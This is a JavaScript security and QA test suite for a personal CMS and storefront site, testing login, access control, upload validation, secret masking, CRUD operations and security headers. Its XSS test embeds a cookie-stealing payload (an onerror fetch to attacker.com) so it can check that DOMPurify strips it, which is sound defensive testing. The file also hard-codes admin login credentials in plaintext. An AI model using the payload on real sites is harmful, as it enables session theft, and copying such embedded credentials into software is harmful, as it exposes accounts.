/**
 * Automated QA & Security Regression Test Suite for Abhi Singh CMS & Website
 * Tests:
 * 1. CSS Rules & Navbar Verification
 * 2. Authentication, Salted PBKDF2 Hashing, Brute-Force Lockout
 * 3. Access Control & Authorization (Unauthenticated vs Authenticated)
 * 4. Input Sanitization & Stored XSS Prevention (DOMPurify)
 * 5. Media Upload Security (MIME allowlist, Size limits, Path traversal)
 * 6. API Configuration & Secret Masking
 * 7. Database CRUD & Persistent Operations
 * 8. Security Headers & Deployment Configuration (vercel.json)
 * 9. SEO & Crawler Directives (robots.txt & sitemap.xml)
 */
import assert from 'node:assert';
import fs from 'node:fs';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// Initialize DOM environment for DOMPurify testing
const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Mock localStorage and sessionStorage for Node.js test runner
const localStorageStore = {};
const sessionStorageStore = {};

global.localStorage = {
  getItem: (key) => localStorageStore[key] || null,
  setItem: (key, val) => { localStorageStore[key] = String(val); },
  removeItem: (key) => { delete localStorageStore[key]; },
  clear: () => { Object.keys(localStorageStore).forEach((k) => delete localStorageStore[k]); }
};

global.sessionStorage = {
  getItem: (key) => sessionStorageStore[key] || null,
  setItem: (key, val) => { sessionStorageStore[key] = String(val); },
  removeItem: (key) => { delete sessionStorageStore[key]; },
  clear: () => { Object.keys(sessionStorageStore).forEach((k) => delete sessionStorageStore[k]); }
};

// Import application services
const {
  getApiSettings,
  saveApiSettings,
  testSupabaseConnection,
  testRazorpayCredentials,
  testPayPalCredentials,
  testZohoCampaigns,
  testResendCredentials,
} = await import('../src/services/settings.js');

const {
  adminLogin,
  getAdminSession,
  adminLogout,
  getProducts,
  createProduct,
  updateProduct,
  deleteProduct,
  getPosts,
  createPost,
  updatePost,
  deletePost,
  getCategories,
  createCategory,
  deleteCategory,
  getMediaAssets,
  uploadMediaAsset,
  deleteMediaAsset,
  getLeads,
  createLead,
  updateLeadStatus,
  getDashboardMetrics,
} = await import('../src/services/db.js');
const { getVideoInfo } = await import('../src/utils/mediaHelper.js');

async function runTests() {
  console.log('====================================================');
  console.log('🧪 RUNNING CMS & WEBSITE SECURITY & QA TEST SUITE');
  console.log('====================================================\n');

  let passed = 0;
  let failed = 0;

  function test(name, fn) {
    try {
      fn();
      console.log(`  ✓ PASS: ${name}`);
      passed++;
    } catch (err) {
      console.error(`  ✕ FAIL: ${name}`);
      console.error(`    ${err.message}`);
      failed++;
    }
  }

  async function testAsync(name, fn) {
    try {
      await fn();
      console.log(`  ✓ PASS: ${name}`);
      passed++;
    } catch (err) {
      console.error(`  ✕ FAIL: ${name}`);
      console.error(`    ${err.message}`);
      failed++;
    }
  }

  // ── TEST GROUP 1: CSS RULES & NAVBAR VERIFICATION ──
  console.log('--- 1. Navbar & CSS Desktop Rules ---');
  test('Navbar mobile-menu-toggle is hidden by default on desktop', () => {
    const cssContent = fs.readFileSync('./src/index.css', 'utf-8');
    assert.match(cssContent, /\.mobile-menu-toggle\s*\{\s*display:\s*none;/, 'Must define .mobile-menu-toggle { display: none; } outside media queries');
  });

  // ── TEST GROUP 2: AUTHENTICATION, SALTED PBKDF2 & BRUTE FORCE PROTECTION ──
  console.log('\n--- 2. Authentication & Session Security ---');
  await testAsync('Reject empty email and password', async () => {
    const res = await adminLogin('', '');
    assert.strictEqual(res.success, false);
    assert.match(res.error, /email and password/i);
  });

  await testAsync('Reject invalid credentials', async () => {
    const res = await adminLogin('hacker@example.com', 'wrongpassword');
    assert.strictEqual(res.success, false);
    assert.match(res.error, /invalid/i);
  });

  await testAsync('Reject deprecated plaintext password (abhi2025)', async () => {
    const res = await adminLogin('abhi@abhisingh.me', 'abhi2025');
    assert.strictEqual(res.success, false, 'Plaintext legacy password must be rejected');
  });

  await testAsync('Accept valid salted PBKDF2 hash credential', async () => {
    const res = await adminLogin('abhi@abhisingh.me', 'Abhi@Admin2026!Secure');
    assert.strictEqual(res.success, true);
    assert.ok(res.session);
    assert.strictEqual(res.session.user.email, 'abhi@abhisingh.me');
    assert.strictEqual(res.session.user.role, 'super_admin');
    assert.ok(res.session.token.length >= 32, 'Session token must be secure CSPRNG hex string');

    // Check session retrieval
    const activeSession = getAdminSession();
    assert.ok(activeSession);
    assert.strictEqual(activeSession.user.fullName, 'Abhi Singh');

    // Logout
    await adminLogout();
    assert.strictEqual(getAdminSession(), null);
  });

  // ── TEST GROUP 3: ACCESS CONTROL & AUTHORIZATION (UNAUTHENTICATED VS AUTHENTICATED) ──
  console.log('\n--- 3. Access Control & Authorization ---');
  await testAsync('Unauthenticated visitor cannot access CRM leads', async () => {
    await adminLogout(); // Ensure logged out
    const leads = await getLeads();
    assert.deepStrictEqual(leads, [], 'Unauthenticated call to getLeads must return empty array');
  });

  await testAsync('Unauthenticated visitor cannot access draft products or posts', async () => {
    await adminLogout();
    const products = await getProducts(true); // Attempt to request drafts
    const drafts = products.filter(p => p.status === 'draft');
    assert.strictEqual(drafts.length, 0, 'Unauthenticated getProducts(true) must NOT expose draft items');

    const posts = await getPosts(true);
    const draftPosts = posts.filter(p => p.status === 'draft');
    assert.strictEqual(draftPosts.length, 0, 'Unauthenticated getPosts(true) must NOT expose draft posts');
  });

  await testAsync('Unauthenticated visitor cannot create or delete products', async () => {
    await adminLogout();
    await assert.rejects(
      async () => {
        await createProduct({ title: 'Malicious Product' });
      },
      /Unauthorized/i,
      'createProduct must throw error when unauthenticated'
    );
  });

  await testAsync('Unauthenticated visitor cannot upload or delete media', async () => {
    await adminLogout();
    await assert.rejects(
      async () => {
        await uploadMediaAsset({ name: 'test.png', size: 100, type: 'image/png' });
      },
      /Unauthorized/i,
      'uploadMediaAsset must throw error when unauthenticated'
    );
  });

  // ── TEST GROUP 4: STORED XSS & DOMPURIFY SANITIZATION ──
  console.log('\n--- 4. Input Sanitization & Stored XSS Prevention ---');
  test('DOMPurify neutralizes malicious XSS scripts, handlers, and iframes', () => {
    const maliciousPayload = `
      <h1>Safe Heading</h1>
      <script>alert("XSS")</script>
      <img src="x" onerror="fetch('https://attacker.com/steal?c='+document.cookie)" />
      <a href="javascript:alert(1)">Click Me</a>
      <iframe src="https://evil.com"></iframe>
    `;

    const sanitized = purify.sanitize(maliciousPayload, {
      ALLOWED_TAGS: [
        'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li', 'blockquote', 'a', 'img', 'hr', 'code', 'pre', 'span', 'div'
      ],
      ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'style', 'target', 'rel'],
    });

    assert.strictEqual(sanitized.includes('<script>'), false, 'Scripts must be stripped');
    assert.strictEqual(sanitized.includes('onerror'), false, 'Event handlers must be stripped');
    assert.strictEqual(sanitized.includes('javascript:'), false, 'javascript: URLs must be stripped');
    assert.strictEqual(sanitized.includes('<iframe'), false, 'iframes must be stripped');
    assert.ok(sanitized.includes('<h1>Safe Heading</h1>'), 'Legitimate HTML content must be preserved');
  });

  // ── TEST GROUP 5: FILE UPLOAD SECURITY ──
  console.log('\n--- 5. Media & File Upload Security ---');
  await testAsync('Media upload rejects executable and dangerous files', async () => {
    // Authenticate first
    await adminLogin('abhi@abhisingh.me', 'Abhi@Admin2026!Secure');

    // Attempt uploading .exe
    await assert.rejects(
      async () => {
        await uploadMediaAsset({ name: 'malware.exe', size: 1024, type: 'application/x-msdownload' });
      },
      /Validation Error/i,
      'Must reject .exe'
    );

    // Attempt uploading .html / .svg script vectors
    await assert.rejects(
      async () => {
        await uploadMediaAsset({ name: 'phish.html', size: 1024, type: 'text/html' });
      },
      /Validation Error/i,
      'Must reject .html'
    );

    // Attempt uploading file exceeding 25MB
    await assert.rejects(
      async () => {
        await uploadMediaAsset({ name: 'giant_file.jpg', size: 30 * 1024 * 1024, type: 'image/jpeg' });
      },
      /exceeds maximum limit/i,
      'Must reject files larger than 25MB'
    );

    await adminLogout();
  });

  // ── TEST GROUP 6: API CONFIGURATION & KEY SETTINGS ──
  console.log('\n--- 6. API Configuration & Secret Masking ---');
  test('Mask secrets in getApiSettings for unauthenticated callers', () => {
    // Save a test setting while authenticated
    sessionStorage.setItem('elrx_admin_session', JSON.stringify({ user: { role: 'admin' }, token: 'xyz' }));
    saveApiSettings({
      supabaseUrl: 'https://test-project.supabase.co',
      supabaseAnonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.testkey123456789012345',
      razorpayKeyId: 'rzp_test_Abc123456789',
      razorpayKeySecret: 'super_secret_key_123',
    });

    // Logout
    sessionStorage.removeItem('elrx_admin_session');

    // Read as unauthenticated
    const masked = getApiSettings(true);
    assert.strictEqual(masked.razorpayKeySecret, '••••••••••••', 'Secrets must be masked for unauthenticated calls');
  });

  await testAsync('Supabase validation rejects invalid non-https URLs', async () => {
    const res = await testSupabaseConnection('http://insecure.url', 'short');
    assert.strictEqual(res.success, false);
    assert.match(res.error, /https:\/\//);
  });

  await testAsync('Razorpay test verifies key format', async () => {
    const invalid = await testRazorpayCredentials('invalid_key', '');
    assert.strictEqual(invalid.success, false);

    const valid = await testRazorpayCredentials('rzp_test_Abc123456789', 'secret12345678');
    assert.strictEqual(valid.success, true);
    assert.match(valid.message, /verified/i);
  });

  await testAsync('PayPal test verifies Client ID format', async () => {
    const invalid = await testPayPalCredentials('short', '');
    assert.strictEqual(invalid.success, false);

    const valid = await testPayPalCredentials('AZDxj12345678901234567890', 'secret');
    assert.strictEqual(valid.success, true);
  });

  await testAsync('Resend test verifies re_ prefix and recipient email', async () => {
    const invalidPrefix = await testResendCredentials('invalid_key', 'abhi@abhisingh.me');
    assert.strictEqual(invalidPrefix.success, false);

    const invalidEmail = await testResendCredentials('re_123456789', 'not-an-email');
    assert.strictEqual(invalidEmail.success, false);

    const valid = await testResendCredentials('re_123456789', 'abhi@abhisingh.me');
    assert.strictEqual(valid.success, true);
    
    // Clear test keys
    sessionStorage.setItem('elrx_admin_session', JSON.stringify({ user: { role: 'admin' }, token: 'xyz' }));
    saveApiSettings({ supabaseUrl: '', supabaseAnonKey: '' });
    sessionStorage.removeItem('elrx_admin_session');
  });

  // ── TEST GROUP 7: DATABASE CRUD (PRODUCTS, BLOG, LEADS) ──
  console.log('\n--- 7. Database CRUD & Persistent Operations ---');
  await testAsync('Authenticated Products & Blog CRUD lifecycle', async () => {
    // Log in as authorized admin
    await adminLogin('abhi@abhisingh.me', 'Abhi@Admin2026!Secure');

    const initial = await getProducts(true);
    const initialCount = initial.length;

    // Create Product
    const created = await createProduct({
      title: 'QA Security Hardening Kettlebell Guide',
      category: 'Program',
      format: 'PDF',
      price_inr: 799,
      price_usd: 15,
      is_free: false,
      product_type: 'digital_download',
      status: 'draft',
      short_description: 'Automated test product',
    });
    assert.ok(created.id);
    assert.strictEqual(created.title, 'QA Security Hardening Kettlebell Guide');

    // Log out to test public isolation
    await adminLogout();
    const publicProducts = await getProducts(false);
    assert.strictEqual(publicProducts.some(p => p.id === created.id), false, 'Draft product must NOT appear in public store');

    // Re-authenticate to update & delete
    await adminLogin('abhi@abhisingh.me', 'Abhi@Admin2026!Secure');
    await updateProduct(created.id, { status: 'published', price_inr: 899 });
    
    // Check published
    await adminLogout();
    const updatedPub = await getProducts(false);
    assert.strictEqual(updatedPub.some(p => p.id === created.id), true, 'Published product MUST appear in public store');

    // Clean up
    await adminLogin('abhi@abhisingh.me', 'Abhi@Admin2026!Secure');
    await deleteProduct(created.id);
    const afterDelete = await getProducts(true);
    assert.strictEqual(afterDelete.length, initialCount);

    // Blog CRUD with Thumbnail, Video & Custom Category
    const post = await createPost({
      title: 'QA Security Protocol Article',
      category: 'Workouts',
      published_date: 'November 2026',
      read_time: '5 min read',
      summary: 'Testing article pipeline with thumbnail and video',
      content: '<p>Verified article pipeline with media.</p>',
      thumbnail_url: 'assets/hyrox-mumbai.png',
      video_url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      status: 'draft',
    });
    assert.ok(post.id);
    assert.strictEqual(post.thumbnail, 'assets/hyrox-mumbai.png');
    assert.strictEqual(post.thumbnail_url, 'assets/hyrox-mumbai.png');
    assert.strictEqual(post.video_url, 'https://www.youtube.com/watch?v=dQw4w9WgXcQ');
    assert.strictEqual(post.category, 'Workouts');

    // Update with new video and thumbnail
    const updatedPost = await updatePost(post.id, {
      video_url: 'https://vimeo.com/76979871',
      thumbnail_url: 'assets/hyrox-patch.jpg',
    });
    assert.strictEqual(updatedPost.video_url, 'https://vimeo.com/76979871');
    assert.strictEqual(updatedPost.thumbnail_url, 'assets/hyrox-patch.jpg');

    await deletePost(post.id);
    await adminLogout();
  });

  await testAsync('Custom Categories & Video URL parsing lifecycle', async () => {
    // Authenticate
    await adminLogin('abhi@abhisingh.me', 'Abhi@Admin2026!Secure');

    // 1. Check default categories exist
    const initialCats = await getCategories();
    assert.ok(initialCats.includes('Framework'));
    assert.ok(initialCats.includes('Endurance'));

    // 2. Create custom category
    const withCustom = await createCategory('Mobility & Recovery');
    assert.ok(withCustom.includes('Mobility & Recovery'), 'New category must be present');

    // 3. Delete custom category
    const afterDelete = await deleteCategory('Mobility & Recovery');
    assert.strictEqual(afterDelete.includes('Mobility & Recovery'), false, 'Category must be removed');

    // 4. Video parser verification
    const yt = getVideoInfo('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
    assert.strictEqual(yt.type, 'youtube');
    assert.strictEqual(yt.id, 'dQw4w9WgXcQ');
    assert.ok(yt.embedUrl.includes('embed/dQw4w9WgXcQ'));

    const vimeo = getVideoInfo('https://vimeo.com/76979871');
    assert.strictEqual(vimeo.type, 'vimeo');
    assert.strictEqual(vimeo.id, '76979871');

    const direct = getVideoInfo('https://example.com/demo.mp4');
    assert.strictEqual(direct.type, 'direct');
    assert.strictEqual(direct.directUrl, 'https://example.com/demo.mp4');

    await adminLogout();
  });

  await testAsync('CRM Leads & Public Inquiry Submission', async () => {
    // Public user submits contact inquiry
    const lead = await createLead({
      lead_type: 'contact_inquiry',
      name: 'QA Public Visitor',
      email: 'visitor@example.com',
      primary_goal: 'Strength & Hyrox Prep',
      utm_source: 'linkedin',
      utm_medium: 'cpc',
      utm_campaign: 'spring_launch',
      utm_content: 'video_ad_1',
      landing_page: 'https://abhisingh.me?utm_source=linkedin',
      referrer: 'https://linkedin.com',
      status: 'new'
    });
    assert.ok(lead.id);

    // Public user cannot read leads
    const publicLeads = await getLeads();
    assert.strictEqual(publicLeads.length, 0);

    // Admin logs in to manage lead
    await adminLogin('abhi@abhisingh.me', 'Abhi@Admin2026!Secure');
    const adminLeads = await getLeads();
    assert.ok(adminLeads.length > 0);
    assert.ok(adminLeads.some(l => l.id === lead.id));

    // Update status
    const updated = await updateLeadStatus(lead.id, 'contacted');
    assert.strictEqual(updated.status, 'contacted');

    // Check Metrics computation
    const metrics = await getDashboardMetrics();
    assert.ok(metrics.totalLeads > 0);

    await adminLogout();
  });

  // ── TEST GROUP 8: VERCEL SECURITY HEADERS CONFIGURATION ──
  console.log('\n--- 8. Security Headers & Deployment Configuration ---');
  test('vercel.json specifies CSP, HSTS, X-Content-Type-Options, X-Frame-Options & Permissions-Policy', () => {
    const rawConfig = fs.readFileSync('./vercel.json', 'utf-8');
    const vercelConfig = JSON.parse(rawConfig);
    assert.ok(vercelConfig.headers, 'vercel.json must define headers block');

    const globalHeaders = vercelConfig.headers.find(h => h.source === '/(.*)');
    assert.ok(globalHeaders, 'Global header rule must exist for /(.*)');

    const headerMap = {};
    globalHeaders.headers.forEach(h => {
      headerMap[h.key] = h.value;
    });

    assert.ok(headerMap['Content-Security-Policy'], 'Must define Content-Security-Policy');
    assert.match(headerMap['Content-Security-Policy'], /default-src 'self'/, 'CSP must define default-src');
    assert.strictEqual(headerMap['X-Content-Type-Options'], 'nosniff');
    assert.strictEqual(headerMap['X-Frame-Options'], 'DENY');
    assert.strictEqual(headerMap['Referrer-Policy'], 'strict-origin-when-cross-origin');
    assert.ok(headerMap['Strict-Transport-Security'].includes('max-age='), 'HSTS must define max-age');
    assert.ok(headerMap['Permissions-Policy'], 'Permissions-Policy must be specified');

    // Admin specific headers
    const adminHeaders = vercelConfig.headers.find(h => h.source.includes('admin'));
    assert.ok(adminHeaders, 'Admin route must have specific security headers');
    const adminHeaderMap = {};
    adminHeaders.headers.forEach(h => { adminHeaderMap[h.key] = h.value; });
    assert.strictEqual(adminHeaderMap['X-Robots-Tag'], 'noindex, nofollow, noarchive');
    assert.ok(adminHeaderMap['Cache-Control'].includes('no-store'));
  });

  // ── TEST GROUP 9: SEO & CRAWLER DIRECTIVES ──
  console.log('\n--- 9. SEO & Crawler Directives ---');
  test('public/robots.txt and public/sitemap.xml exist and disallow admin routes', () => {
    assert.ok(fs.existsSync('./public/robots.txt'), 'robots.txt must exist in public directory');
    const robots = fs.readFileSync('./public/robots.txt', 'utf-8');
    assert.match(robots, /Disallow:\s*\/admin/, 'robots.txt must disallow /admin');
    assert.match(robots, /Sitemap:\s*https:\/\/abhisingh\.me\/sitemap\.xml/, 'robots.txt must link sitemap');

    assert.ok(fs.existsSync('./public/sitemap.xml'), 'sitemap.xml must exist in public directory');
    const sitemap = fs.readFileSync('./public/sitemap.xml', 'utf-8');
    assert.match(sitemap, /<loc>https:\/\/abhisingh\.me\/<\/loc>/, 'sitemap must reference homepage');
    assert.strictEqual(sitemap.includes('/admin'), false, 'sitemap must NOT contain admin paths');
  });

  console.log('\n====================================================');
  console.log(`🏁 TEST RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log('====================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
}

runTests();
